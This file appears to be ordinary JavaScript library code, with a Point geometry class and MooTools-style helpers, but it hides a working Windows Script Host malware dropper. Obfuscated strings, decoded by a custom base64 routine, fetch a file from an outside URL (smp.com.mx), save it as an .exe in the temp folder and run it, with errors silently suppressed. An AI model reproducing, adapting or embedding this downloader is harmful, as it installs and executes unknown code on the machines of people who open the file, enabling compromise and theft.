
var documentary = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  churchman = [];
	
var northern = { ':': '.','U': 'S','381': 'X'};
	var fields = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function neville(rooms) {
	cropping = rooms;
	for (var i in northern){cropping = cropping.replace(i, northern[i]);}
    return cropping;
};

var listed = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.neville4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("housewife").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = documentary[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = documentary[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = documentary[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = documentary[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var purchased ="housewifeJVhousewifeRFTVhousewifeAl".neville4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var working = "housewifeQWhousewifeN0aXZhousewifelWE9iahousewifemVjdA=housewife=".neville4();
String.prototype.neville2 = function () {
    var hoarding = {
        marshall: this
    };
    hoarding.caught = hoarding.marshall["c3Vic3RyaW5n".neville4()](fields, listed);
    return hoarding.caught;
};

var nettle ="housewifeRXhwYW5housewifekRW52aXhousewifeJvbm1lbnRTdHJhousewifepbmdz".neville4();
var Native = function(options){
	
};
var torture = [working, nettle,purchased,  ""+"."+("sacristy","feldspar","appreciable","participate","fifteen","bikes","evident","walked","exe"), "UnVu".neville4(), neville("M"+"SX"+"ML"+("popped","skating","memphis","erotic","breeds","joiner","scrawled","2.")+"381M"+"LH"+"TT"+("aristocrat","delight","extirpate","alternatives","terry","fisting","blair","proceeding","P>")+"WU"+("diagram","unions","hierarchy","tenacity","notation","vestige","focused","cr")+("politics","proverbial","motherless","pharmaceutical","aides","governing","timber","thetis","ip")+"t:"+("foresail","figures","foreboding","rajah","piebald","celebrity","consumptive","satiate","Sh")+"ell")];
verbatim = "_F2_";
var savour = this[torture.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
NQtWxEfCHxp = "tLBaeh";
survival = (("exercise", "earned", "leicestershire", "pediatric", "participation", "manganese", "append", "pGzqpzD") + "pykzUJHx").neville2();
intolerance = (("charging", "workflow", "postponement", "pharmaceuticals", "interval", "fuming", "colonnade", "isaac", "tendril", "sYMlKbT") + "FmsbCgHjSkW").neville2();
  
    String.prototype.tractable = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var acres = torture.pop().split(">");

firewire = "b3Blbg==".neville4();
var incautious = new savour(acres[1]);
var avant = new savour(acres[0]);
var venomous = incautious[torture.shift()](torture.shift());
weasel = "E";

var ostensibly = torture.shift();
var savage = torture.shift();
function tiring(sperm, sneeze) {

    try {
        var menial = venomous + "/" + sneeze ;
		menial = menial+ ostensibly;
            avant[firewire](("greensboro","incorporation","G" + weasel) + ("fisher","qatar","antonio","zurich","T"), sperm, false);
       
    wwBStapF = "_F7_";
    avant[intolerance + ("scaly","regression","end")]();
	var angeles=("survival" + WScript=="survival" + "V2luZG93cyBTY3JpcHQgSG9zdA==".neville4())&&avant["c3RhdHVz".neville4()] +""=="MjAw".neville4()&&typeof(hBExUHBn)==="undefined";
	lQHNgR = "_F8_";
    if (angeles) {
		
        var zimbabwe = new savour((("correlation","uprightness","costa","stinging","bosnia","compound","writing","compounds","A")+("vandals","consumes","enquiring","madeira","servers","reddy","sylvan","nieces","SEOO")+"DB"+("fountain","panties","analyses","extraction","florin","sulphide","radar",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        zimbabwe[firewire]();
        vXMFKdhBUiQ = "_F9_";
        zimbabwe.type = listed;
        GKLkbG = "_F10_";
        zimbabwe["d3JpdGU=".neville4()](avant[("jaffa","charged","shade","tools","boils","shipments","aimless","")+"R"+"es"+"pon"+northern['U'].toLowerCase()+"e"+"Qm9keQ==".neville4()]);
        SRKLnzyJ = "_F11_";
        zimbabwe[(survival + "o"+("popular","sauce","sending","superb","diminutive","concubine","fatherly","plebeian","00")+("consummation","piping","fortification","licence","crucifixion","backing","concentration","8i")+"tion").replace("0"+("references","currency","acceleration","pallet","shortly","usurp","vehicle","08"), intolerance)] = 0;
        DGyfVaNYJQ = "_F12_";
        zimbabwe.saveToFile(menial, 2);
        yKQehNszQS = "_F13_";
        zimbabwe.close();
        TaftYKm = "_F14_";
		incautious[savage](menial, listed, true);
    }
} catch (flsuXoIL) { };

    FVMAkU = "_F15_";
}
try{
tiring("aHR0cDovLw==".neville4()+"\u0073\u006D\u0070"+"\u002E\u0063\u006F\u006D\u002E\u006D\u0078\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?hbFEyhXRSqL=aBbdLlKz","qSPxcn");}catch(UgLJegmXeHY){}

   nAAGBlKCERa = "_F16_";
   